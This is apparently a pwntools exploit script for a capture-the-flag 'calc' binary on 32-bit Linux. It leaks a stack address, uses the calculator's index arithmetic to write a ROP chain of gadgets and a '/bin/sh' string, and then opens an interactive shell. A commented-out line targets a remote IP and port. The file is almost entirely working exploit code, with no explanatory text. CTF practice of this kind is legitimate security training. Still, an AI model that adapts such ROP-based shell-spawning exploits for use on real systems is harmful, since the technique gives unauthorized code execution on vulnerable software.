from tabnanny import check
from pwn import *
context(arch = "i386", os = "Linux", log_level = "Debug")
io = process("./calc")
# io = remote("124.70.130.92", 60001)
gdb.attach(io)

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim), data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num=4096           :io.recv(num)
ru      = lambda delims             :io.recvuntil(delims)
rl      = lambda                    :io.recvline()
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def place(pos, num):
    sl("+" + str(pos) + "+" + str(num))
    rl()

def setzero(pos):
    print("check")
    sl("+" + str(pos))
    num = int(rl())
    if num < 0:
        num = "+" + str(0 - num)
    else:
        num = "-" + str(num)
    sl("+" + str(pos) + num)
    rl()

#symbols
pop_eax = 0x0805c34b
pop_ebx_esi = 0x0804a094
pop_edx_ecx_ebx = 0x080701d0
pop_edx = 0x080701aa
pop_esi_edi = 0x0808fac3
mov_edi_0_add_eax_3 = 0x0809084b
syscall = 0x08070880

#get stack addr to get addr of string "/bin/sh"
ru("tor ===\n")
sl("+360")
stack=int(rl())+28

# reverse order to arrange stack
# in order to avoid overlap

#place data to 376 and add 375 with the data(change data in 375)
place(375, u32("/sh\0"))
#place data to 375 and add 374 with the data(change data in 374)
place(374, u32("/bin"))
place(373, syscall)
place(372, mov_edi_0_add_eax_3)
setzero(371)
place(369, pop_esi_edi)

sl("+368")
num = int(rl())
sl("+368-" + str(num - stack))
rl()
place(366, pop_ebx_esi)
setzero(364)
setzero(365)
place(362, pop_edx_ecx_ebx)
place(361, 8)
#place data to 361 and add 360
place(360, pop_eax)
log.info("Stack Address : " + hex(stack))
pause()
sl("q")
itr()